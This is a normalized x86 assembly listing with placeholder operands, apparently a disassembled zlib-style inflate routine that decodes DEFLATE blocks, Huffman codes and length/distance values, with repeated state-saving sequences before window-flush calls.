jmp r-xdata
mov [ esp + 0x8 ] 0xfffffffc
mov ecx [ esp + 0x10 ]
mov eax [ esp ]
mov [ eax + 0x20 ] ecx
mov edx [ esp + 0x14 ]
mov ecx [ esp ]
mov [ ecx + 0x1c ] edx
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x4 ]
sub ecx [ eax ]
mov edx [ esp + 0x4 ]
add [ edx + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
mov edx [ esp + 0x20 ]
mov ecx [ esp ]
mov [ ecx + 0x30 ] edx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
shr [ esp + 0x10 ] 0x3
sub [ esp + 0x14 ] 0x3
mov ecx [ esp ]
mov [ ecx ] 0x3
jmp r-xdata
dec edx
je r-xdata
mov ecx [ esp ]
mov [ ecx ] edx
jmp r-xdata
add edx 0xfffffff9
mov edx [ esp + 0xc ]
push edx
mov ecx [ esp + 0x1c ]
push ecx
mov eax [ esp + 0x28 ]
push eax
call sub_4626c8
add esp 0xc
mov edx [ esp + 0xc ]
add [ esp + 0x18 ] edx
mov ecx [ esp + 0xc ]
sub [ esp + 0x1c ] ecx
mov eax [ esp + 0xc ]
add [ esp + 0x20 ] eax
mov edx [ esp + 0xc ]
sub [ esp + 0x24 ] edx
mov ecx [ esp + 0xc ]
mov eax [ esp ]
sub [ eax + 0x4 ] ecx
jne r-xdata
mov eax [ esp + 0x24 ]
mov [ esp + 0xc ] eax
mov edx [ esp + 0x20 ]
mov eax [ esp ]
mov [ eax + 0x30 ] edx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x30 ]
mov [ esp + 0x20 ] ecx
mov eax [ esp + 0x20 ]
mov edx [ esp ]
cmp eax [ edx + 0x2c ]
jae r-xdata
mov eax [ esp ]
mov edx [ eax + 0x24 ]
mov [ esp + 0x20 ] edx
mov ecx [ esp + 0x20 ]
mov eax [ esp ]
cmp ecx [ eax + 0x2c ]
jae r-xdata
mov eax [ esp + 0x4 ]
mov ebx [ esp + 0x4 ]
mov ecx 0x4
mov edx [ esp + 0xc ]
mov eax [ eax + 0x28 ]
call [ ebx + 0x20 ]
mov edx [ esp ]
test eax eax
mov [ edx + 0xc ] eax
jne r-xdata
mov [ esp + 0xc ] 0x13
mov ecx [ esp + 0x14 ]
dec [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
mov dl [ eax ]
xor eax eax
mov al dl
shl eax cl
or [ esp + 0x10 ] eax
inc [ esp + 0x18 ]
add [ esp + 0x14 ] 0x8
cmp [ esp + 0x14 ] 0x3
jb r-xdata
mov edx [ esp ]
xor ecx ecx
mov [ edx + 0x8 ] ecx
mov eax [ esp ]
mov [ eax ] 0x5
jmp r-xdata
mov edx [ esp + 0xc ]
mov [ esp + 0x8 ] edx
cmp [ esp + 0x8 ] 0xfffffffd
jne r-xdata
mov eax [ esp + 0x44 ]
sub eax 0xe
mov eax 0x7
jmp r-xdata
mov ecx [ esp + 0x14 ]
dec [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
mov dl [ eax ]
xor eax eax
mov al dl
shl eax cl
or [ esp + 0x10 ] eax
inc [ esp + 0x18 ]
add [ esp + 0x14 ] 0x8
mov edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
jb r-xdata
mov ecx [ esp ]
mov [ ecx ] 0x7
sub [ esp + 0x14 ] 0x8
inc [ esp + 0x1c ]
dec [ esp + 0x18 ]
shr [ esp + 0x10 ] 0x3
sub [ esp + 0x14 ] 0x3
mov eax [ esp ]
mov [ eax ] 0x9
mov edx [ esp + 0x4 ]
mov [ edx + 0x18 ] rw-data
mov [ esp + 0x8 ] 0xfffffffd
mov ecx [ esp + 0x10 ]
mov eax [ esp ]
mov [ eax + 0x20 ] ecx
mov edx [ esp + 0x14 ]
mov ecx [ esp ]
mov [ ecx + 0x1c ] edx
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x4 ]
sub ecx [ eax ]
mov edx [ esp + 0x4 ]
add [ edx + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
mov edx [ esp + 0x20 ]
mov ecx [ esp ]
mov [ ecx + 0x30 ] edx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
jmp r-xdata
mov edx 0x7
mov ecx [ esp ]
cmp [ ecx + 0x18 ] 0x0
jne r-xdata
mov edx [ esp ]
mov eax [ edx + 0x28 ]
sub eax [ esp + 0x20 ]
mov ecx [ esp ]
mov eax [ ecx + 0x2c ]
sub eax [ esp + 0x20 ]
dec eax
jmp r-xdata
mov eax [ esp ]
mov ecx [ eax + 0x28 ]
sub ecx [ esp + 0x20 ]
mov edx [ esp ]
mov ecx [ edx + 0x2c ]
sub ecx [ esp + 0x20 ]
dec ecx
jmp r-xdata
shr [ esp + 0x10 ] 0xe
sub [ esp + 0x14 ] 0xe
mov eax [ esp ]
xor edx edx
mov [ eax + 0x8 ] edx
mov ecx [ esp ]
mov [ ecx ] 0x4
jmp r-xdata
mov [ esp + 0x8 ] 0xfffffffc
mov ecx [ esp + 0x10 ]
mov eax [ esp ]
mov [ eax + 0x20 ] ecx
mov edx [ esp + 0x14 ]
mov ecx [ esp ]
mov [ ecx + 0x1c ] edx
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x4 ]
sub ecx [ eax ]
mov edx [ esp + 0x4 ]
add [ edx + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
mov edx [ esp + 0x20 ]
mov ecx [ esp ]
mov [ ecx + 0x30 ] edx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp ]
mov [ edx + 0x20 ] eax
mov ecx [ esp + 0x14 ]
mov eax [ esp ]
mov [ eax + 0x1c ] ecx
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x4 ]
sub eax [ edx ]
mov ecx [ esp + 0x4 ]
add [ ecx + 0x8 ] eax
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x4 ]
mov [ edx ] eax
mov ecx [ esp + 0x20 ]
mov eax [ esp ]
mov [ eax + 0x30 ] ecx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov ecx [ esp ]
mov [ ecx ] 0x9
mov [ esp + 0x40 ] edx
jmp r-xdata
add edx 0xfffffff8
mov [ esp + 0x3c ] eax
mov edx 0xb
cmp [ esp + 0x44 ] 0x12
je r-xdata
mov eax [ esp ]
mov [ eax ] edx
jmp r-xdata
add edx 0xfffffff9
cmp [ esp + 0x24 ] 0x0
jne r-xdata
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x2c ]
cmp edx [ ecx + 0x24 ]
je r-xdata
mov [ esp + 0x24 ] eax
mov edx [ esp + 0x20 ]
mov ecx [ esp ]
cmp edx [ ecx + 0x28 ]
jne r-xdata
mov [ esp + 0x24 ] ecx
mov ecx [ esp + 0xc ]
add ecx [ esp + 0x3c ]
cmp ecx [ esp + 0x14 ]
ja r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp ]
mov [ eax + 0x20 ] edx
mov edx [ esp + 0x14 ]
mov ecx [ esp ]
mov [ ecx + 0x1c ] edx
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x4 ]
sub ecx [ eax ]
mov edx [ esp + 0x4 ]
add [ edx + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
mov edx [ esp + 0x20 ]
mov ecx [ esp ]
mov [ ecx + 0x30 ] edx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0x24 ]
mov [ esp + 0x20 ] edx
mov ecx [ esp + 0x20 ]
mov eax [ esp ]
cmp ecx [ eax + 0x2c ]
jae r-xdata
cmp [ esp + 0x1c ] 0x0
je r-xdata
mov ecx [ esp + 0xc ]
shr [ esp + 0x10 ] cl
mov eax [ esp + 0xc ]
sub [ esp + 0x14 ] eax
mov edx [ esp + 0x3c ]
mov eax [ edx * 4 + rw-data ]
and eax [ esp + 0x10 ]
add [ esp + 0x40 ] eax
mov ecx [ esp + 0x3c ]
shr [ esp + 0x10 ] cl
mov edx [ esp + 0x3c ]
sub [ esp + 0x14 ] edx
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov [ esp + 0x3c ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x4 ]
mov [ esp + 0xc ] eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0xc ]
shr ecx 0x5
and edx 0x1f
and ecx 0x1f
mov eax [ esp + 0x3c ]
add edx ecx
add eax [ esp + 0x40 ]
add edx 0x102
cmp edx eax
jb r-xdata
mov eax [ esp ]
mov ecx [ eax + 0x28 ]
sub ecx [ esp + 0x20 ]
mov edx [ esp ]
mov ecx [ edx + 0x2c ]
sub ecx [ esp + 0x20 ]
dec ecx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp ]
mov [ edx + 0x20 ] eax
mov ecx [ esp + 0x14 ]
mov eax [ esp ]
mov [ eax + 0x1c ] ecx
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x4 ]
sub eax [ edx ]
mov ecx [ esp + 0x4 ]
add [ ecx + 0x8 ] eax
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x4 ]
mov [ edx ] eax
mov ecx [ esp + 0x20 ]
mov eax [ esp ]
mov [ eax + 0x30 ] ecx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
xor ecx ecx
mov [ esp + 0x8 ] ecx
jmp r-xdata
mov edx [ esp ]
mov [ edx ] 0x9
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x18 ] rw-data
mov [ esp + 0x8 ] 0xfffffffd
mov eax [ esp + 0x10 ]
mov edx [ esp ]
mov [ edx + 0x20 ] eax
mov ecx [ esp + 0x14 ]
mov eax [ esp ]
mov [ eax + 0x1c ] ecx
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x4 ]
sub eax [ edx ]
mov ecx [ esp + 0x4 ]
add [ ecx + 0x8 ] eax
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x4 ]
mov [ edx ] eax
mov ecx [ esp + 0x20 ]
mov eax [ esp ]
mov [ eax + 0x30 ] ecx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
cmp [ esp + 0x44 ] 0x10
jne r-xdata
mov [ esp + 0x24 ] ecx
mov ecx [ esp + 0x14 ]
dec [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
mov al [ edx ]
xor edx edx
mov dl al
shl edx cl
or [ esp + 0x10 ] edx
inc [ esp + 0x18 ]
add [ esp + 0x14 ] 0x8
cmp [ esp + 0x44 ] 0x10
jne r-xdata
cmp [ esp + 0x3c ] 0x1
jae r-xdata
xor edx edx
mov edx [ esp ]
mov ecx [ edx + 0xc ]
mov eax [ esp + 0x3c ]
mov edx [ ecx + eax * 4 - 0x4 ]
jmp r-xdata
mov eax [ esp ]
mov ecx [ eax + 0xc ]
mov eax [ esp + 0x3c ]
mov edx [ esp + 0x44 ]
mov [ ecx + eax * 4 ] edx
inc [ esp + 0x3c ]
dec [ esp + 0x40 ]
jne r-xdata
mov ecx [ esp + 0x3c ]
mov eax [ esp ]
mov [ eax + 0x8 ] ecx
mov [ esp + 0x44 ] edx
sub_469ba8
add esp 0xfffffff4
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_468778
mov eax [ esp ]
mov ecx [ esp + 0x4 ]
mov edx [ eax + 0x24 ]
mov eax [ ecx + 0x28 ]
mov ecx [ esp + 0x4 ]
call [ ecx + 0x24 ]
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ eax + 0x28 ]
call [ ecx + 0x24 ]
xor eax eax
add esp 0xc
retn
sub_469bf4
add esp 0xfffffff4
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp + 0x8 ]
push eax
mov edx [ esp + 0x8 ]
push edx
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x24 ]
push eax
call sub_4626c8
add esp 0xc
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x24 ]
add ecx [ esp + 0x8 ]
mov [ eax + 0x30 ] ecx
mov edx [ esp ]
mov [ edx + 0x2c ] ecx
add esp 0xc
retn
sub_469c38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov edx 0x1
mov ecx 0x1a
mov eax [ eax + 0x28 ]
call [ ebx + 0x20 ]
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x10 ]
xor ecx ecx
mov [ edx ] ecx
mov al [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x10 ] al
mov cl [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
mov [ eax + 0x11 ] cl
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x12 ] edx
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x16 ] eax
sub_469c9c
add esp 0xffffffc8
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0xc ]
mov [ esp + 0x34 ] edx
mov ecx [ esp + 0x4 ]
mov eax [ ecx ]
mov [ esp + 0x20 ] eax
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x4 ]
mov [ esp + 0x24 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x20 ]
mov [ esp + 0x18 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x1c ]
mov [ esp + 0x1c ] eax
mov edx [ esp ]
mov ecx [ edx + 0x30 ]
mov [ esp + 0x28 ] ecx
mov eax [ esp + 0x28 ]
mov edx [ esp ]
cmp eax [ edx + 0x2c ]
jae r-xdata
mov edx [ esp ]
mov eax [ edx + 0x28 ]
sub eax [ esp + 0x28 ]
mov ecx [ esp ]
mov eax [ ecx + 0x2c ]
sub eax [ esp + 0x28 ]
dec eax
jmp r-xdata
mov [ esp + 0x8 ] 0xfffffffe
mov ecx [ esp + 0x18 ]
mov eax [ esp ]
mov [ eax + 0x20 ] ecx
mov edx [ esp + 0x1c ]
mov ecx [ esp ]
mov [ ecx + 0x1c ] edx
mov eax [ esp + 0x24 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x4 ]
sub ecx [ eax ]
mov edx [ esp + 0x4 ]
add [ edx + 0x8 ] ecx
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
mov edx [ esp + 0x28 ]
mov ecx [ esp ]
mov [ ecx + 0x30 ] edx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp [ ecx * 4 + jump_table_469d24 ]
mov [ esp + 0x2c ] eax
cmp [ esp + 0x2c ] 0x102
jb r-xdata
mov ecx [ esp + 0x34 ]
mov eax [ ecx + 0xc ]
mov [ esp + 0xc ] eax
mov edx [ esp + 0x1c ]
cmp edx [ esp + 0xc ]
jae r-xdata
mov ecx [ esp + 0x34 ]
mov eax [ ecx + 0x8 ]
mov [ esp + 0xc ] eax
mov edx [ esp + 0x1c ]
cmp edx [ esp + 0xc ]
jae r-xdata
mov eax [ esp + 0x34 ]
mov edx [ eax + 0xc ]
mov [ esp + 0xc ] edx
mov ecx [ esp + 0x1c ]
cmp ecx [ esp + 0xc ]
jae r-xdata
mov ecx [ esp + 0x34 ]
mov eax [ ecx + 0x8 ]
mov [ esp + 0xc ] eax
mov edx [ esp + 0x1c ]
cmp edx [ esp + 0xc ]
jae r-xdata
mov eax [ esp + 0x34 ]
mov edx [ esp + 0x28 ]
sub edx [ eax + 0xc ]
mov [ esp + 0x30 ] edx
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x28 ]
mov eax [ ecx + 0xc ]
mov ecx [ esp ]
sub edx [ ecx + 0x24 ]
cmp eax edx
jbe r-xdata
cmp [ esp + 0x2c ] 0x0
jne r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ esp ]
mov [ eax + 0x30 ] ecx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x30 ]
mov [ esp + 0x28 ] ecx
mov eax [ esp + 0x28 ]
mov edx [ esp ]
cmp eax [ edx + 0x2c ]
jae r-xdata
mov [ esp + 0x8 ] 0x1
mov eax [ esp + 0x18 ]
mov edx [ esp ]
mov [ edx + 0x20 ] eax
mov ecx [ esp + 0x1c ]
mov eax [ esp ]
mov [ eax + 0x1c ] ecx
mov edx [ esp + 0x24 ]
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x4 ]
sub eax [ edx ]
mov ecx [ esp + 0x4 ]
add [ ecx + 0x8 ] eax
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x4 ]
mov [ edx ] eax
mov ecx [ esp + 0x28 ]
mov eax [ esp ]
mov [ eax + 0x30 ] ecx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov [ esp + 0x8 ] 0xfffffffd
mov edx [ esp + 0x18 ]
mov ecx [ esp ]
mov [ ecx + 0x20 ] edx
mov eax [ esp + 0x1c ]
mov edx [ esp ]
mov [ edx + 0x1c ] eax
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x4 ]
sub edx [ ecx ]
mov eax [ esp + 0x4 ]
add [ eax + 0x8 ] edx
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x4 ]
mov [ ecx ] edx
mov eax [ esp + 0x28 ]
mov edx [ esp ]
mov [ edx + 0x30 ] eax
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x34 ]
xor ecx ecx
mov cl [ edx + 0x10 ]
mov [ eax + 0xc ] ecx
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x34 ]
mov ecx [ edx + 0x12 ]
mov [ eax + 0x8 ] ecx
mov edx [ esp + 0x34 ]
mov [ edx ] 0x1
cmp [ esp + 0x24 ] 0xa
jb r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ ecx * 4 + rw-data ]
and eax [ esp + 0x18 ]
shl eax 0x3
add edx eax
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x10 ]
mov cl [ edx + 0x1 ]
xor edx edx
shr [ esp + 0x18 ] cl
mov eax [ esp + 0x10 ]
mov dl [ eax + 0x1 ]
xor eax eax
sub [ esp + 0x1c ] edx
mov ecx [ esp + 0x10 ]
mov al [ ecx ]
mov [ esp + 0x14 ] eax
cmp [ esp + 0x14 ] 0x0
jne r-xdata
cmp [ esp + 0x24 ] 0x0
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x34 ]
mov edx [ eax * 4 + rw-data ]
and edx [ esp + 0x18 ]
add [ ecx + 0x4 ] edx
mov ecx [ esp + 0xc ]
shr [ esp + 0x18 ] cl
mov eax [ esp + 0xc ]
sub [ esp + 0x1c ] eax
xor eax eax
mov edx [ esp + 0x34 ]
mov al [ edx + 0x11 ]
mov edx [ esp + 0x34 ]
mov [ edx + 0xc ] eax
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x34 ]
mov eax [ ecx + 0x16 ]
mov [ edx + 0x8 ] eax
mov ecx [ esp + 0x34 ]
mov [ ecx ] 0x3
cmp [ esp + 0x24 ] 0x0
je r-xdata
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0xc ]
mov eax [ ecx + 0x8 ]
mov ecx [ edx * 4 + rw-data ]
and ecx [ esp + 0x18 ]
shl ecx 0x3
add eax ecx
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x10 ]
mov cl [ eax + 0x1 ]
xor eax eax
shr [ esp + 0x18 ] cl
mov edx [ esp + 0x10 ]
xor ecx ecx
mov al [ edx + 0x1 ]
sub [ esp + 0x1c ] eax
mov edx [ esp + 0x10 ]
mov cl [ edx ]
mov [ esp + 0x14 ] ecx
test [ esp + 0x14 ] 0x10
je r-xdata
cmp [ esp + 0x24 ] 0x0
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x34 ]
mov edx [ eax * 4 + rw-data ]
and edx [ esp + 0x18 ]
add [ ecx + 0xc ] edx
mov ecx [ esp + 0xc ]
shr [ esp + 0x18 ] cl
mov eax [ esp + 0xc ]
sub [ esp + 0x1c ] eax
mov edx [ esp + 0x34 ]
mov [ edx ] 0x5
cmp [ esp + 0x24 ] 0x0
je r-xdata
mov eax [ esp + 0x34 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x28 ]
mov edx [ eax + 0xc ]
mov eax [ esp ]
sub ecx [ eax + 0x24 ]
sub edx ecx
mov ecx [ esp ]
mov eax [ ecx + 0x28 ]
sub eax edx
mov [ esp + 0x30 ] eax
jmp r-xdata
xor ecx ecx
mov [ esp + 0x8 ] ecx
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x28 ]
mov dl [ eax + 0x8 ]
mov [ ecx ] dl
inc [ esp + 0x28 ]
dec [ esp + 0x2c ]
xor edx edx
mov eax [ esp + 0x34 ]
mov [ eax ] edx
jmp r-xdata
mov eax [ esp + 0x28 ]
mov edx [ esp ]
cmp eax [ edx + 0x28 ]
jne r-xdata
mov edx [ esp ]
mov eax [ edx + 0x28 ]
sub eax [ esp + 0x28 ]
mov ecx [ esp ]
mov eax [ ecx + 0x2c ]
sub eax [ esp + 0x28 ]
dec eax
jmp r-xdata
add esp 0x38
retn
mov edx [ esp ]
mov eax [ esp + 0x18 ]
mov [ edx + 0x20 ] eax
mov eax [ esp ]
mov ecx [ esp + 0x1c ]
mov [ eax + 0x1c ] ecx
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x24 ]
mov [ ecx + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x4 ]
sub eax [ edx ]
add [ ecx + 0x8 ] eax
mov edx [ esp + 0x4 ]
mov eax [ esp + 0x20 ]
mov [ edx ] eax
mov eax [ esp ]
mov ecx [ esp + 0x28 ]
mov [ eax + 0x30 ] ecx
mov edx [ esp + 0x34 ]
mov ecx [ edx + 0x16 ]
push ecx
mov eax [ esp + 0x4 ]
push eax
mov edx [ esp + 0xc ]
push edx
xor edx edx
mov eax [ esp + 0x40 ]
mov ecx [ esp + 0x40 ]
mov dl [ eax + 0x11 ]
mov eax [ esp + 0x40 ]
mov ecx [ ecx + 0x12 ]
movzx eax [ eax + 0x10 ]
call sub_46ab60
mov [ esp + 0x8 ] eax
mov edx [ esp + 0x4 ]
mov ecx [ edx ]
mov [ esp + 0x20 ] ecx
mov eax [ esp + 0x4 ]
mov edx [ eax + 0x4 ]
mov [ esp + 0x24 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x20 ]
mov [ esp + 0x18 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov [ esp + 0x1c ] ecx
mov eax [ esp ]
mov edx [ eax + 0x30 ]
mov [ esp + 0x28 ] edx
mov ecx [ esp + 0x28 ]
mov eax [ esp ]
cmp ecx [ eax + 0x2c ]
jae r-xdata
test [ esp + 0x14 ] 0x10
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x34 ]
mov ecx [ edx + 0x4 ]
mov [ eax + 0x8 ] ecx
mov edx [ esp + 0x34 ]
mov [ edx ] 0x6
jmp r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp ]
mov [ edx + 0x20 ] eax
mov ecx [ esp + 0x1c ]
mov eax [ esp ]
mov [ eax + 0x1c ] ecx
mov edx [ esp + 0x24 ]
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x4 ]
sub eax [ edx ]
mov ecx [ esp + 0x4 ]
add [ ecx + 0x8 ] eax
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x4 ]
mov [ edx ] eax
mov ecx [ esp + 0x28 ]
mov eax [ esp ]
mov [ eax + 0x30 ] ecx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
xor ecx ecx
mov [ esp + 0x8 ] ecx
jmp r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp ]
mov [ edx + 0x20 ] eax
mov ecx [ esp + 0x1c ]
mov eax [ esp ]
mov [ eax + 0x1c ] ecx
mov edx [ esp + 0x24 ]
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x4 ]
sub eax [ edx ]
mov ecx [ esp + 0x4 ]
add [ ecx + 0x8 ] eax
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x4 ]
mov [ edx ] eax
mov ecx [ esp + 0x28 ]
mov eax [ esp ]
mov [ eax + 0x30 ] ecx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
xor ecx ecx
mov [ esp + 0x8 ] ecx
jmp r-xdata
test [ esp + 0x14 ] 0x40
jne r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x14 ]
and eax 0xf
mov [ edx + 0x8 ] eax
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x34 ]
mov eax [ ecx + 0x4 ]
mov [ edx + 0xc ] eax
mov ecx [ esp + 0x34 ]
mov [ ecx ] 0x4
jmp r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ esp ]
mov [ ecx + 0x20 ] edx
mov eax [ esp + 0x1c ]
mov edx [ esp ]
mov [ edx + 0x1c ] eax
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x4 ]
sub edx [ ecx ]
mov eax [ esp + 0x4 ]
add [ eax + 0x8 ] edx
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x4 ]
mov [ ecx ] edx
mov eax [ esp + 0x28 ]
mov edx [ esp ]
mov [ edx + 0x30 ] eax
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp ]
mov [ edx + 0x20 ] eax
mov ecx [ esp + 0x1c ]
mov eax [ esp ]
mov [ eax + 0x1c ] ecx
mov edx [ esp + 0x24 ]
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x4 ]
sub eax [ edx ]
mov ecx [ esp + 0x4 ]
add [ ecx + 0x8 ] eax
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x4 ]
mov [ edx ] eax
mov ecx [ esp + 0x28 ]
mov eax [ esp ]
mov [ eax + 0x30 ] ecx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
xor ecx ecx
mov [ esp + 0x8 ] ecx
jmp r-xdata
cmp [ esp + 0x2c ] 0x0
jne r-xdata
mov edx [ esp + 0x34 ]
xor ecx ecx
mov [ edx ] ecx
jmp r-xdata
mov edx [ esp + 0x34 ]
mov ecx [ edx ]
cmp ecx 0x9
ja r-xdata
